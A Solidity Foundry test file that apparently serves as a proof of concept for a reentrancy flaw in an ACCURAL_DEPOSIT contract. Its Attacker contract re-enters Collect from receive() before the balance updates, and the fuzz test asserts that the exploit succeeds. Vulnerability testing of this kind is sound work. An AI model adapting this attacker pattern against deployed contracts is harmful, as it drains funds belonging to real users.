
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT, LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {

    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public log;
    Attacker public _attacker;

    function setUp() public {
        log = new LogFile();
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _contractUnderTest.SetLogFile(address(log));
        _contractUnderTest.Initialized();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal, uint256 depositVal) public {
        vm.assume(depositVal >= 1 ether);
        vm.assume(attackVal > 0);
        vm.assume(attackVal <= depositVal / 2);
        vm.assume(depositVal <= type(uint128).max);
        vm.assume(attackVal <= type(uint128).max);

        vm.deal(address(this), depositVal * 2);
        vm.deal(address(_attacker), depositVal * 2);

        _attacker.setupAttack{value: depositVal}(depositVal, attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;

    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    bool public reentryBeforeUpdate;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = ACCURAL_DEPOSIT(victimAddress);
    }

    function setupAttack(uint256 depositVal, uint256 attackVal) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        reentryBeforeUpdate = false;

        victim.Deposit{value: depositVal}();
        storedAttackVal = attackVal;
    }

    function attack(uint256 val) public {
        initialSnapshot = victim.balances(address(this));

        victim.Collect(val);

        if (reentryBeforeUpdate && attackCallCount == 2) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            reentryBeforeUpdate = (victim.balances(address(this)) == initialSnapshot);
            victim.Collect(storedAttackVal);
        }
    }
}
